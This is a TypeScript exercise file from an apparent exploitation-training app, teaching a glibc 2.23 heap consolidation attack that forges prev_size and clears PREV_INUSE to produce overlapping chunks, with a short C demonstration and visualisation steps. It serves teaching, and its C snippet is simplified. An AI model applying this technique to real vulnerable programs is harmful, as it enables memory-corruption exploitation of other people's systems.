import { Exercise } from '../types';

const exercise: Exercise = {
  id: 'glibc-110',
  unitId: 'unit19-glibc-bypass',
  title: '110: Heap Consolidation Exploit',
  desc: '<b>Goal:</b> When a non-fastbin, non-tcache chunk is freed, glibc checks PREV_INUSE of the <em>next</em> chunk. If it\'s clear, the allocator consolidates backward — merging the freed chunk with the previous one. By forging a fake <code>prev_size</code> and clearing PREV_INUSE, you can trick consolidation into creating an <strong>overlapping chunk</strong> that spans another live allocation.',
  source: {
    c: [
      { text: '// Heap consolidation exploit (glibc 2.23)', cls: 'cmt' },
      { text: '// Forge prev_size + clear PREV_INUSE', cls: 'cmt' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    void *a = malloc(128);', cls: 'highlight' },
      { text: '    void *b = malloc(128);', cls: 'highlight' },
      { text: '    void *c = malloc(128);', cls: 'highlight' },
      { text: '    void *guard = malloc(16);', cls: '' },
      { text: '', cls: '' },
      { text: '    free(a);', cls: 'highlight' },
      { text: '    // Overflow b to forge c\'s prev_size', cls: 'cmt' },
      { text: '    // and clear c\'s PREV_INUSE bit', cls: 'cmt' },
      { text: '    *(size_t*)(c - 8) = 0x110; // fake prev_size', cls: 'highlight vuln' },
      { text: '    *(size_t*)(c - 4) &= ~1; // clear PREV_INUSE', cls: 'highlight vuln' },
      { text: '    free(c);', cls: 'highlight vuln' },
      { text: '    // consolidation: c merges backward to a', cls: 'cmt' },
      { text: '    // new free chunk spans a + b + c', cls: 'cmt' },
      { text: '    void *big = malloc(384);', cls: 'highlight vuln' },
      { text: '    // big overlaps b! Write to b via big.', cls: 'cmt' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'step',
  vizMode: 'heap',
  heapSize: 2048,
  glibcVersion: '2.23',
  showLabels: true,
  steps: [
    {
      action: 'init',
      log: ['info', 'When glibc frees a chunk, it checks the PREV_INUSE bit of the <em>next</em> chunk\'s size field. If clear, the allocator reads <code>prev_size</code> to find the previous chunk and merges them. This is consolidation — and it trusts attacker-controllable metadata.'],
    },
    {
      log: ['action', 'Allocating A (128), B (128), C (128), and a guard chunk.'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const a = heap.malloc(128);
        const b = heap.malloc(128);
        const c = heap.malloc(128);
        const guard = heap.malloc(16);
        heap._nameMap = {};
        if (a) heap._nameMap.A = a.addr;
        if (b) heap._nameMap.B = b.addr;
        if (c) heap._nameMap.C = c.addr;
        if (guard) heap._nameMap.guard = guard.addr;
      },
      srcLine: 5,
    },
    {
      log: ['action', 'free(A) — A is freed and placed in unsorted bin (no tcache in glibc 2.23; too large for fastbins). A\'s PREV_INUSE is cleared on B\'s header.'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const addr = heap._nameMap?.A;
        if (addr !== undefined) heap.free(addr);
      },
      srcLine: 10,
    },
    {
      log: ['info', 'Now we simulate an overflow from B into C\'s header. We forge C\'s <code>prev_size</code> to point all the way back to A, and clear C\'s PREV_INUSE bit. This tricks free(C) into thinking A+B+C is one contiguous free region.'],
      vizAction: (_sim: any, heap: any) => {
        if (!heap) return;
        const aAddr = heap._nameMap?.A;
        const cAddr = heap._nameMap?.C;
        if (aAddr !== undefined && cAddr !== undefined) {
          const fakePrevSize = cAddr - aAddr;
          heap._writeLE(cAddr, fakePrevSize, 4);
          const sizeField = heap._readLE(cAddr + 4, 4);
          heap._writeLE(cAddr + 4, sizeField & ~1, 4);
          const chunk = heap.chunks.get(cAddr);
          if (chunk) chunk.prevInUse = false;
        }
      },
      srcLine: 13,
    },
    {
      log: ['success', 'free(C) triggers backward consolidation. glibc reads prev_size from C → finds A (which is free) → merges A+B+C into one giant free chunk. Now malloc(384) returns a chunk that <strong>overlaps B</strong> — you have read/write access to B\'s data through the new allocation!'],
      srcLine: 15,
      done: true,
    },
  ],
  check: () => true,
  winTitle: 'Overlapping Chunks!',
  winMsg: 'Forging prev_size and clearing PREV_INUSE tricks backward consolidation into creating a chunk that overlaps live allocations. This is the foundation of House of Einherjar and many modern heap exploits.',
};

export default exercise;
